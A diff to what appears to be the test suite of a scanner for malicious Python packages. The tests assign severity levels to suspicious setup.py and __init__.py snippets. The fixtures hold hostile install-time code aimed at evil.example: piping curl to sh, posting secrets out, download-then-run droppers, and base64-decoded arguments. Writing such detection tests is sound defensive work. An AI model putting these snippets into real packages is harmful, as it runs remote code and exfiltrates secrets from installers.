@@ -248,14 +248,20 @@ def test_pth_in_sdist_is_ignored() -> None:
 @pytest.mark.parametrize(
     ("setup_py", "severity"),
     [
-        ("import os\nos.system('curl evil.example | sh')", "high"),
-        ("import subprocess as sp\nsp.Popen(['sh', '-c', 'x'])", "high"),
-        ("import requests\nrequests.post('https://evil.example', data=secrets)", "high"),
-        ("import socket\ns = socket.socket()", "high"),
+        ("import os\nos.system('curl evil.example | sh')", "medium"),
+        ("import subprocess as sp\nsp.Popen(['sh', '-c', 'x'])", "medium"),
+        ("import requests\nrequests.post('https://evil.example', data=secrets)", "medium"),
+        ("import socket\ns = socket.socket()", "medium"),
         (  # download, then run: a dropper
             "import urllib.request, os\n"
             "urllib.request.urlretrieve(u, '/tmp/x')\n"
             "os.system('/tmp/x')",
+            "high",
+        ),
+        (  # run what was downloaded
+            "import urllib.request, os\n"
+            "payload = urllib.request.urlopen(u).read()\n"
+            "os.system(payload)",
             "critical",
         ),
     ],
@@ -263,6 +269,37 @@ def test_pth_in_sdist_is_ignored() -> None:
 def test_setup_py_install_time(setup_py: str, severity: str) -> None:
     findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
     assert rule_ids(findings) == ["setup_py_install_time"]
+    assert findings[0].severity == severity
+
+
+@pytest.mark.parametrize(
+    ("setup_py", "severity"),
+    [  # build tools, written out in full: low
+        ("import subprocess\nsubprocess.run(['git', 'rev-parse', 'HEAD'])", "low"),
+        ("import subprocess\nsubprocess.run('sycl-ls', shell=True)", "low"),
+        ("import os\nos.system('python setup.py sdist upload')", "low"),
+        ("import subprocess, sys\nsubprocess.run([sys.executable, str(script)])", "low"),
+        ("import subprocess\nsubprocess.run(['/usr/bin/nvidia-smi'])", "low"),
+        # not build tools, or can't tell: medium
+        ("import subprocess\nsubprocess.run(cmd)", "medium"),
+        ("import os\nos.system('git pull | sh')", "medium"),
+        ("import subprocess\nsubprocess.run(['curl', 'https://evil.example'])", "medium"),
+        ("import subprocess, sys\nsubprocess.run([sys.executable, '-c', code])", "medium"),
+        ("import subprocess, sys\nsubprocess.run([sys.executable, '-m', 'pip'])", "medium"),
+        (  # a build tool, but run with decoded data
+            "import subprocess, base64\nsubprocess.run(['git', base64.b64decode(x)])",
+            "critical",
+        ),
+        (  # build tools don't make a download high
+            "import subprocess, urllib.request\n"
+            "urllib.request.urlretrieve(u, 'x.tar.gz')\n"
+            "subprocess.run(['make'])",
+            "medium",
+        ),
+    ],
+)
+def test_setup_py_build_tools(setup_py: str, severity: str) -> None:
+    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
     assert findings[0].severity == severity
 
 
@@ -338,11 +375,11 @@ def test_import_time_calls_follow_functions_run_on_import(start: str) -> None:
 @pytest.mark.parametrize(
     ("init_py", "severity"),
     [
-        ("import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])", "high"),
-        ("import urllib.request\nurllib.request.urlopen('https://evil.example')", "high"),
+        ("import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])", "medium"),
+        ("import urllib.request\nurllib.request.urlopen('https://evil.example')", "medium"),
         (  # download, then run
             "import os, requests\nrequests.get(u)\nos.system('/tmp/x')",
-            "critical",
+            "high",
         ),
         (  # run a decoded payload in a new Python process
             "import subprocess, sys, base64\n"
